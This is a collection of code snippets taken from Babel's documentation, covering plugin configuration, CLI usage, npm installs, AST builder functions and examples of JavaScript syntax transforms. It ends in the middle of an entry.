JavaScript\nDESCRIPTION: Demonstrates the `export default from` syntax using the plugin. It allows exporting a value `v` directly from module `mod`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-export-default-from.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport v from \"mod\";\n```\n\n----------------------------------------\n\nTITLE: Minifying JavaScript with CLI and preset option\nDESCRIPTION: This command shows how to use simple preset options via CLI. The example sets the `mangle` option to `false`.\nSOURCE: https://github.com/babel/website/blob/main/docs/minify.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nminify input.js --mangle false\n```\n\n----------------------------------------\n\nTITLE: Enabling keepFnName for mangle and deadcode in babel.config.json\nDESCRIPTION: This JSON configuration demonstrates the equivalent of the previous configuration, where `keepFnName` is applied to both the `mangle` and `deadcode` plugins explicitly.  This shows how options are shared between plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-minify.md#_snippet_8\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [[\"minify\", {\n    \"mangle\": {\n      \"keepFnName\": true\n    },\n    \"deadcode\": {\n      \"keepFnName\": true\n    }\n  }]]\n}\n```\n\n----------------------------------------\n\nTITLE: Checking for Expression Nodes in JavaScript\nDESCRIPTION: This code snippet demonstrates how to check if a given AST node is an Expression node using the `t.isExpression(node)` method in Babel. It covers a wide range of expression types like ArrayExpression, ArrowFunctionExpression, and CallExpression. The purpose is to identify nodes that evaluate to a value.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_264\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isExpression(node);\n```\n\n----------------------------------------\n\nTITLE: Creating a BlockStatement Node\nDESCRIPTION: Creates an AST node representing a block statement. Requires `body` (an array of `Statement`) and accepts an optional `directives` parameter (an array of `Directive`, defaults to `[]`). Use `t.isBlockStatement(node, opts)` to check if a node is a BlockStatement and `t.assertBlockStatement(node, opts)` to assert that a node is a BlockStatement.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.blockStatement(body, directives);\n```\n\n----------------------------------------\n\nTITLE: Using Sets JavaScript\nDESCRIPTION: This code demonstrates the use of the `Set` data structure. It creates a new Set, adds elements to it, and checks its size and contents. It requires the Babel polyfill. It showcases the basic operations on a Set.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_20\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Sets\nvar s = new Set();\ns.add(\"hello\").add(\"goodbye\").add(\"hello\");\ns.size === 2;\ns.has(\"hello\") === true;\n```\n\n----------------------------------------\n\nTITLE: Using Duo with Babel via Node API\nDESCRIPTION: This snippet shows how to use the `duo-babel` plugin with the Duo Node.js API.  It demonstrates configuring Duo to use Babel as middleware during the build process. Requires `Duo`, `root`, `entry`, `babel` and `fn` to be defined.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/duo/usage.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nDuo(root)\n  .entry(entry)\n  .use(babel)\n  .run(fn);\n```\n\n----------------------------------------\n\nTITLE: Install Babel Dependencies with npm\nDESCRIPTION: This command installs the specified Babel-related packages as development dependencies using npm.  The packages include requirejs-babel, @babel/standalone, and babel-plugin-module-resolver-standalone.  The --save-dev flag ensures that the packages are saved as development dependencies in the package.json file.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/requirejs/install.md#_snippet_0\n\nLANGUAGE: Shell Script\nCODE:\n```\nnpm install --save-dev requirejs-babel @babel/standalone babel-plugin-module-resolver-standalone\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration for Decorators\nDESCRIPTION: This JSON code configures Babel to use the new version of the decorators proposal by setting the `version` option of the `@babel/plugin-proposal-decorators` plugin to `\"2023-01\"`. This ensures that Babel correctly transforms code using the updated decorators syntax.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-02-20-7.21.0.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-env\"],\n  \"plugins\": [\n    [\"@babel/plugin-proposal-decorators\", { \"version\": \"2023-01\" }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: ForAwaitStatement Removal\nDESCRIPTION: This code snippet demonstrates how to handle the removal of `ForAwaitStatement` nodes. The functionality is now incorporated into the `ForOfStatement` node using the `await` field.  Plugins should now check the `await` property of `ForOfStatement` instead of using `ForAwaitStatement`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_16\n\nLANGUAGE: diff\nCODE:\n```\n interface ForOfStatement <: ForInStatement {\n   type: \"ForOfStatement\";\n+  await: boolean;\n }\n```\n\nLANGUAGE: diff\nCODE:\n```\n return {\n-  ForAwaitStatement(path) {\n-    ...\n+  ForOfStatement(path) {\n+    if (path.node.await) {\n+      ...\n+    }\n   }\n };\n```\n\n----------------------------------------\n\nTITLE: Creating an ObjectTypeInternalSlot in JavaScript\nDESCRIPTION: This code snippet demonstrates creating an `ObjectTypeInternalSlot` AST node using `t.objectTypeInternalSlot(id, value, optional, static, method)`. It represents an internal slot in a Flow object type annotation. Parameters include an ID, value type, and flags for optional, static, and method.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_129\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.objectTypeInternalSlot(id, value, optional, static, method);\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugin Proposal Pipeline Operator\nDESCRIPTION: This snippet shows how to configure the @babel/plugin-proposal-pipeline-operator plugin in Babel. It demonstrates the change from a default configuration to explicitly specifying the \"minimal\" proposal. This change is intended to give users more control over which version of the pipeline operator proposal they are using, as the proposal is still in flux.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-07-27-removing-babels-stage-presets.md#_snippet_2\n\nLANGUAGE: diff\nCODE:\n```\n{\n  \"plugins\": [\n-   \"@babel/plugin-proposal-pipeline-operator\"\n+   [\"@babel/plugin-proposal-pipeline-operator\", { \"proposal\": \"minimal\" }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Shell: Wrap Legacy Decorators with External Helpers\nDESCRIPTION: This command installs `decorators-compat` and uses `wrap-legacy-decorators` with `--decorators-before-export`, `--external-helpers`, and `--write` flags. This avoids injecting the wrapper function in each file by using an external dependency, suitable for Node or bundlers like Webpack/Rollup.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-09-17-decorators.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save decorators-compat\nnpx wrap-legacy-decorators src/file-with-decorators.js --decorators-before-export --external-helpers --write\n```\n\n----------------------------------------\n\nTITLE: Exported TSImportEqualsDeclaration Parsing (TypeScript)\nDESCRIPTION: This snippet shows how Babel 8 parses exporting TSImportEqualsDeclaration as an ExportNamedDeclaration.  The `isExport` field is removed; `p.parentPath.isExportNamedDeclaration()` should be used to detect export status. The example is a TypeScript export import statement.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_8\n\nLANGUAGE: typescript\nCODE:\n```\nexport import foo = require(\"foo\")\n```\n\n----------------------------------------\n\nTITLE: Decorator JavaScript Example\nDESCRIPTION: Demonstrates the use of decorators, a stage 1 ES7 proposal, to modify class properties and methods. Includes custom decorators `concat` and `autobind` to illustrate property descriptor composition and automatic binding of methods.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction concat(...args) {\n  let sep = args.pop();\n\n  return function(target, key, descriptor) {\n    descriptor.initializer = function() {\n      return args.map(arg => this[arg]).join(sep);\n    }\n  }\n}\n\nfunction autobind(target, key, descriptor) {\n  var fn = descriptor.value;\n  delete descriptor.value;\n  delete descriptor.writable;\n  descriptor.get = function () {\n    var bound = fn.bind(this);\n    Object.defineProperty(this, key, {\n      configurable: true,\n      writable: true,\n      value: bound\n    });\n    return bound;\n  };\n}\n\nclass Person {\n  firstName = \"Sebastian\";\n  lastName = \"McKenzie\";\n\n  @concat(\"firstName\", \"lastName\", \" \") fullName;\n  @concat(\"lastName\", \"firstName\", \", \") formalName;\n\n  @autobind\n  getFullName() {\n    return `${this.firstName} ${this.lastName}`;\n  }\n}\n\nassert(new Person().fullName, \"Sebastian McKenzie\");\nassert(new Person().formalName, \"McKenzie, Sebastian\");\nassert(new Person().getFullName.call(null), \"Sebastian McKenzie\");\n```\n\n----------------------------------------\n\nTITLE: Babel CLI Usage\nDESCRIPTION: This command shows how to use the Babel CLI with the @babel/plugin-syntax-module-string-names plugin. It transforms script.js using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-module-string-names.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-module-string-names script.js\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via Node API\nDESCRIPTION: Uses the babel-plugin-minify-flip-comparisons plugin via the Node API.  The `transformSync` method from `@babel/core` is used to transform the input `code` string with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-flip-comparisons.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"minify-flip-comparisons\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: This JavaScript code demonstrates how to use the @babel/plugin-syntax-import-reflection plugin programmatically via the Node API. It transforms the given 'code' string using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-reflection.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-import-reflection\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Checking for Flow Nodes in JavaScript\nDESCRIPTION: This code snippet demonstrates how to check if a given AST node is a Flow node using the `t.isFlow(node)` method in Babel. It covers various Flow-specific AST nodes, including type annotations and declarations. The purpose is to determine if a node is related to Flow type checking.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_266\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isFlow(node);\n```\n\n----------------------------------------\n\nTITLE: Reduce statement into expression - JavaScript\nDESCRIPTION: This example demonstrates how `babel-plugin-minify-simplify` reduces if statements into expressions using logical AND (`&&`) and ternary operators (`? :`). The plugin simplifies the code for better compressibility during minification.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-simplify.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction foo() {\n  if (x) a();\n}\nfunction foo2() {\n  if (x) a();\n  else b();\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction foo() {\n  x && a();\n}\nfunction foo2() {\n  x ? a() : b();\n}\n```\n\n----------------------------------------\n\nTITLE: Checking for Miscellaneous Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is one of the non-standard AST types sometimes used for development purposes. It uses the `t.isMiscellaneous(node)` method from Babel's `types` API. This covers nodes such as `Noop`, `Placeholder`, and `V8IntrinsicIdentifier`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_282\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isMiscellaneous(node);\n```\n\n----------------------------------------\n\nTITLE: Flip Comparisons Example\nDESCRIPTION: Demonstrates how the babel-plugin-minify-flip-comparisons plugin transforms JavaScript code by flipping comparisons. The plugin changes `a === 1` to `1 === a` and `bar !== null` to `null !== bar`. This is done for minification purposes.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-flip-comparisons.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst foo = a === 1;\nif (bar !== null) {\n  var baz = 0;\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst foo = 1 === a;\nif (null !== bar) {\n  var baz = 0;\n}\n```\n\n----------------------------------------\n\nTITLE: Flow Declare Field Example (JavaScript)\nDESCRIPTION: This code snippet demonstrates the use of Flow's `declare` modifier for class fields.  Fields marked with `declare` are type-only and should be removed by Babel during transformation.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-03-16-7.9.0.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nclass Foo {\n  x: ?string; // A \"real\" field\n  declare y: number; // A type-only field\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a TSTypeQuery Node in JavaScript\nDESCRIPTION: This snippet demonstrates how to create a `TSTypeQuery` AST node using Babel's `t.tsTypeQuery` method. It requires an expression name (a `TSEntityName | TSImportType`) and an optional `TSTypeParameterInstantiation`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_219\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsTypeQuery(exprName, typeParameters);\n```\n\n----------------------------------------\n\nTITLE: Babel CLI Usage Example\nDESCRIPTION: This shell command demonstrates how to use the Babel CLI to transform a JavaScript file (`script.js`) using the `@babel/plugin-proposal-async-do-expressions` plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-async-do-expressions.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-proposal-async-do-expressions script.js\n```\n\n----------------------------------------\n\nTITLE: Super Is Callable Constructor JavaScript\nDESCRIPTION: This snippet defines a class extending another class. When `superIsCallableConstructor` is enabled, Babel assumes that the superclass is callable. This restricts the ability to extend native classes or built-ins, allowing only compiled classes or ES5 `function` constructors, improving performance in certain scenarios.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_23\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Child extends Parent {\n  constructor() {\n    super(42);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Stripping TypeScript Type Annotations (JavaScript)\nDESCRIPTION: This JavaScript snippet defines a `Greeter` function with a TypeScript type annotation for the `greeting` parameter.  Babel, with the typescript preset installed, will strip this `: string` annotation. Babel does not perform type checking.\nSOURCE: https://github.com/babel/website/blob/main/docs/index.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction Greeter(greeting: string) {\n  this.greeting = greeting;\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a TS Boolean Keyword Node in Babel\nDESCRIPTION: Creates a `TSBooleanKeyword` AST node using the Babel types module. This node represents the `boolean` keyword in TypeScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_162\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsBooleanKeyword();\n```\n\n----------------------------------------\n\nTITLE: CLI Usage Example (Shell)\nDESCRIPTION: Demonstrates how to use the babel-plugin-minify-replace plugin via the Babel CLI.  The `--plugins` flag specifies the plugin to use when transforming the `script.js` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-replace.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins minify-replace script.js\n```\n\n----------------------------------------\n\nTITLE: CLI Usage (Shell)\nDESCRIPTION: This command demonstrates how to use the Babel CLI to transform a JavaScript file with the plugin enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-duplicate-named-capturing-groups-regex.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-duplicate-named-capturing-groups-regex script.js\n```\n\n----------------------------------------\n\nTITLE: Records and Tuples Syntax (Input)\nDESCRIPTION: Example of the Records and Tuples syntax in JavaScript.  This is the input code that will be transformed by Babel. The code uses the `#` prefix to denote records and tuples.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-02-22-7.13.0.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet data = #{\n  name: \"Babel\",\n  ids: #[1, 2, 3]\n};\n```\n\n----------------------------------------\n\nTITLE: Import WASM Source Input\nDESCRIPTION: This is the input JavaScript code that uses `import source` to import a WebAssembly module. The plugin will transform this code based on the target environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-wasm-source.md#_snippet_0\n\nLANGUAGE: js\nCODE:\n```\nimport source libMod from \"./lib.wasm\";\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: Executes Babel from the command line, specifying the `@babel/plugin-syntax-class-properties` plugin.  This allows Babel to parse the class properties syntax in the input script.js file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-class-properties.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-class-properties script.js\n```\n\n----------------------------------------\n\nTITLE: Auto Self Binding Example JavaScript\nDESCRIPTION: Demonstrates auto self binding using the `::` operator when nothing is specified before it.  This effectively binds the function to its object.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-bind.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n$(\".some-link\").on(\"click\", ::view.reset);\n// is equivalent to:\n$(\".some-link\").on(\"click\", view.reset.bind(view));\n```\n\n----------------------------------------\n\nTITLE: Transformed For-of Loop in JavaScript\nDESCRIPTION: This JavaScript code shows the compiled version of the `for...of` loop when targeting older environments. This version uses a traditional `for` loop with an index to iterate through the array.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet elm;\n\nfor (let _i = 0, _array = array; _i < _array.length; _i++) {\n  elm = _array[_i];\n  console.log(elm);\n}\n```\n\n----------------------------------------\n\nTITLE: Install plugin via npm Shell\nDESCRIPTION: This command installs the `@babel/plugin-transform-instanceof` plugin as a development dependency using npm. This plugin transforms the instanceof operator.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-instanceof.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-instanceof\n```\n\n----------------------------------------\n\nTITLE: Using Babel Preset ES2017 via CLI\nDESCRIPTION: This shell command demonstrates how to use the @babel/preset-es2017 preset when transforming a file using the Babel CLI.  It specifies the preset using the --presets flag. 'script.js' would be the target file to transpile.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-es2017.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel script.js --presets @babel/preset-es2017\n```\n\n----------------------------------------\n\nTITLE: Creating a TSConstructSignatureDeclaration Node in JavaScript\nDESCRIPTION: This code snippet demonstrates how to create a `TSConstructSignatureDeclaration` AST node using the `t.tsConstructSignatureDeclaration` builder function. The function takes type parameters, parameters, and a type annotation as arguments. This node represents a construct signature in a TypeScript interface or type.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_165\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsConstructSignatureDeclaration(typeParameters, parameters, typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Use babel-plugin-transform-minify-booleans via CLI\nDESCRIPTION: Executes the Babel CLI to transform a JavaScript file using the transform-minify-booleans plugin.\nRequires: Babel CLI installed globally or locally. Input: Babel command with plugin specified. Output: Transformed JavaScript file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-minify-booleans.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins transform-minify-booleans script.js\n```\n\n----------------------------------------\n\nTITLE: Safari Class Field Bug with Import (JavaScript)\nDESCRIPTION: This code shows how the Safari class field bug can be triggered when using Webpack or compiling to CommonJS, as they often add parentheses when transforming imports.  The parentheses around `_dep.hello` triggers the bug in older Safari versions. This is addressed by `@babel/plugin-bugfix-safari-class-field-initializer-scope`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-07-26-7.25.0.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nimport { hello } from \"./dep\";\n\nclass A {\n  prop = hello();\n}\n```\n\n----------------------------------------\n\nTITLE: Constant Folding Example\nDESCRIPTION: This example demonstrates the `babel-plugin-minify-constant-folding` plugin. It shows how constant expressions are evaluated and inlined during minification. For now only deals with numbers and strings.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-26-babili.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n2 * 3;\n\"b\" + a + \"c\" + \"d\" + g + z + \"f\" + \"h\" + \"z\"\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n6;\n\"b\" + a + \"cd\" + g + z + \"fhz\";\n```\n\n----------------------------------------\n\nTITLE: Creating a DeclareOpaqueType AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.declareOpaqueType` to create a declare opaque type node in the AST for Flow type annotations. It takes an ID (Identifier), optional TypeParameterDeclaration, and an optional supertype (FlowType).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_40\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.declareOpaqueType(id, typeParameters, supertype);\n```\n\n----------------------------------------\n\nTITLE: Transpile Regex with Unicode and DotAll Flags - JavaScript\nDESCRIPTION: Transforms a regular expression literal with both the `/s` (dotAll) and `/u` (unicode) flags to its equivalent representation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-dotall-regex.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n/./su;\n```\n\n----------------------------------------\n\nTITLE: Enabling keepFnName in babel.config.json\nDESCRIPTION: This JSON configuration demonstrates how to use the `keepFnName` option to prevent function names from being mangled or removed. This configuration sets the option directly on the `minify` preset.  The following example shows how to apply the same option to both mangle and deadcode configurations.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-minify.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [[\"minify\", {\n    \"keepFnName\": true\n  }]]\n}\n```\n\n----------------------------------------\n\nTITLE: Named capturing groups regex with runtime disabled in JavaScript\nDESCRIPTION: Example JavaScript code showing a regular expression with named capture groups when runtime is disabled. Illustrates the difference in functionality, where internal group references work, but runtime properties like `.groups` will not.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-named-capturing-groups-regex.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar stringRe = /(?<quote>\"|').*?\\k<quote>/;\n\nstringRe.test(\"'foo'\"); // \"true\", works\nstringRe.exec(\"'foo'\").groups.quote; // Error\n```\n\n----------------------------------------\n\nTITLE: Installing dynamic-import syntax plugin (JavaScript)\nDESCRIPTION: This snippet demonstrates how to install the `babel-plugin-syntax-dynamic-import` plugin to enable dynamic import functionality. It is required to enable the dynamic import feature in Babel.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n// install\n$ npm install babel-plugin-syntax-dynamic-import --save-dev\n```\n\n----------------------------------------\n\nTITLE: Named Capturing Groups Support in Babel\nDESCRIPTION: This snippet demonstrates support for named capturing groups in regular expressions. Allows to reference captured groups by name instead of by index.  Babel ensures that the regex features are compatible across different JavaScript environments.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\nstr.match({String.raw`/^(?<year>\\d{4})-(?<month>\\d{2})-(?<day>\\d{2})$/`})\n```\n\n----------------------------------------\n\nTITLE: TypeScript Template Literal Types Example\nDESCRIPTION: This code demonstrates the usage of template literal types in TypeScript 4.1. It defines a type `Events` and a mapped type `Handler` that uses template literals to create property names with a prefix 'on'. This enables type-safe event handler definitions.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-10-15-7.12.0.md#_snippet_0\n\nLANGUAGE: TypeScript\nCODE:\n```\ntype Events = \"Click\" | \"Focus\";\n\ntype Handler = {\n  [K in `on${Events}`]: Function\n};\n\nconst handler: Handler = {\n    onClick() {}, // Ok\n    onFocus() {}, // Ok\n    onHover() {}, // Error!\n};\n```\n\n----------------------------------------\n\nTITLE: Partial Application in Babel 8\nDESCRIPTION: Illustrates partial application syntax in Babel 8 for pre-filling arguments to a function.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_16\n\nLANGUAGE: javascript\nCODE:\n```\nf(?, a)\n```\n\n----------------------------------------\n\nTITLE: Installing Babel packages using npm\nDESCRIPTION: This shell command installs babel-loader and @babel/core as development dependencies using npm. babel-loader is a webpack loader that transpiles JavaScript files with Babel, and @babel/core is the core Babel compiler. The `--save-dev` flag ensures that these packages are added to the `devDependencies` section of the `package.json` file.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/webpack/install.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev babel-loader @babel/core\n```\n\n----------------------------------------\n\nTITLE: Webpack Config with Core-js 3\nDESCRIPTION: Configures a Webpack entry point to include core-js polyfills for Promise and array iterator. This is necessary for environments that lack native Promise support when using dynamic imports with Webpack and @babel/preset-env.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-dynamic-import.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst config = {\n  entry: [\n    \"core-js/modules/es.promise\",\n    \"core-js/modules/es.array.iterator\",\n    path.resolve(__dirname, \"src/main.js\"),\n  ],\n  // ...\n};\n```\n\n----------------------------------------\n\nTITLE: Preset Ordering in babel.config.json\nDESCRIPTION: This JSON snippet shows how presets are executed in reverse order.  In this example, the preset 'c' will run first, followed by 'b', and then 'a'. This ordering is important for ensuring compatibility and desired transformations.\nSOURCE: https://github.com/babel/website/blob/main/docs/presets.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"a\", \"b\", \"c\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming a File Asynchronously (Example)\nDESCRIPTION: Provides an example of using `babel.transformFile` to transform a file and accessing the transformed code, source map, and AST from the result object within the callback.  It highlights the file-based asynchronous transformation.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabel.transformFile(\"filename.js\", options, function(err, result) {\n  result; // => { code, map, ast }\n});\n```\n\n----------------------------------------\n\nTITLE: Transform Computed Properties - Output with setComputedProperties false\nDESCRIPTION: This code snippet demonstrates the JavaScript code outputted by the @babel/plugin-transform-computed-properties plugin when setComputedProperties is false.  It uses _defineProperty helper function from @babel/runtime/helpers/defineProperty.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-computed-properties.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport _defineProperty from \"@babel/runtime/helpers/defineProperty\";\n\nvar _obj;\n\nvar obj = ((_obj = {}),\n_defineProperty(_obj, \"x\" + foo, \"heh\"),\n_defineProperty(_obj, \"y\" + bar, \"noo\"),\n_defineProperty(_obj, \"foo\", \"foo\"),\n_defineProperty(_obj, \"bar\", \"bar\"),\n_obj);\n```\n\n----------------------------------------\n\nTITLE: Install Babel Runtime Corejs2 and Plugin (Shell)\nDESCRIPTION: This snippet demonstrates the installation of `@babel/runtime-corejs2` for polyfilling `core-js` and `@babel/plugin-transform-runtime` as a dev dependency. It showcases the setup needed when core-js support is required.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_14\n\nLANGUAGE: shell\nCODE:\n```\n# install the runtime as a dependency\nnpm install @babel/runtime-corejs2\n# install the plugin as a devDependency\nnpm install @babel/plugin-transform-runtime --save-dev\n```\n\n----------------------------------------\n\nTITLE: Computed Class Properties JavaScript\nDESCRIPTION: Demonstrates the syntax for computed class properties in JavaScript. The example shows how to define class properties with keys that are determined by expressions or variables within the class definition. Requires babylon parser support.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Example\nclass Foo {\n  [x]\n  ['y']\n}\n\nclass Bar {\n  [p]\n  [m] () {}\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Babel packages with npm\nDESCRIPTION: This command installs the @babel/register and @babel/core packages as development dependencies using npm. These packages are essential for Babel's transpilation and runtime environment setup, often used during development.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/jasmine/install.md#_snippet_0\n\nLANGUAGE: Shell Script\nCODE:\n```\nnpm install --save-dev @babel/register @babel/core\n```\n\n----------------------------------------\n\nTITLE: Creating ExportDefaultSpecifier in JavaScript\nDESCRIPTION: This snippet shows how to create an `ExportDefaultSpecifier` AST node using Babel's `t.exportDefaultSpecifier` method. The `exported` parameter is required and should be an `Identifier` node. This node is used in named exports to rename the default export.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_63\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.exportDefaultSpecifier(exported);\n```\n\n----------------------------------------\n\nTITLE: Usage via Babel CLI\nDESCRIPTION: This shell command demonstrates how to use the @babel/plugin-transform-destructuring plugin directly from the command line. It applies the plugin to a specific JavaScript file (`script.js`) during the Babel transformation process. It can be used to transform individual files.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-destructuring.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-destructuring script.js\n```\n\n----------------------------------------\n\nTITLE: Switching to Babel in Browser\nDESCRIPTION: This snippet demonstrates how to switch from the standard JSX transformer to Babel for in-browser JSX transformation. It involves changing the script type from 'text/jsx' to 'text/babel'.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-02-23-babel-loves-react.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<script type='text/babel'></script>\n```\n\n----------------------------------------\n\nTITLE: Installing the plugin using npm/yarn\nDESCRIPTION: This command installs the @babel/plugin-proposal-explicit-resource-management package as a development dependency using npm or yarn.\nSOURCE: 